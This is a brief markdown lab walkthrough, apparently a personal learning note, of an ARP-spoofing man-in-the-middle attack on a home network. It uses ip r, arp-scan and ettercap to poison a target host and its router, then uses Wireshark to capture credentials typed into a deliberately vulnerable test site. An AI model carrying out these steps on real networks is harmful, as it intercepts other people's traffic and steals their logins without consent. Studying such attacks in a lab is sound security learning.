`ip r`  
```
default via 192.168.1.1 dev eth0 proto dhcp src 192.168.1.105 metric 100 
192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.105 metric 100
```
Gateway (router) : 192.168.1.1  


`sudo arp-scan -I eth0 192.168.1.0/24`  
```
Interface: eth0, type: EN10MB, MAC: 08:00:27:50:4c:14, IPv4: 192.168.1.105
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     f0:51:36:1f:17:96       TCT mobile ltd
192.168.1.102   28:f1:0e:21:14:8d       Dell Inc.
192.168.1.107   c4:85:08:d3:4a:00       Intel Corporate
```
Target: 192.168.1.107  

`sudo ettercap -G`  
open GUI ettercap  
 
Hosts - `scan for hosts` -> Hosts - `host list` -> Found hosts are only `192.168.1.1` and `192.168.1.100` (is [ettercap using other ARP scan techniques than arp-scan?](arp-ettercap)) -> Targets - select targets - add `192.168.1.107   c4:85:08:d3:4a:00` as Target1 and  `192.168.1.1     f0:51:36:1f:17:96` as Target2 -> MITM -ARP spoof - `sniff remote connection` -> Plugins - manage plugins - `chk_poison`:  
```
Activating chk_poison plugin...
chk_poison: Checking poisoning status...
chk_poison: Poisoning process successful!
```

open and sniff `wireshark` on `eth0` ->  open [HTTP site](http://testphp.vulnweb.com/login.php) -> pass some credentials on that site -> find credentials in `wireshark` logs  

![arp-spoof](./img/arp-spoof.png)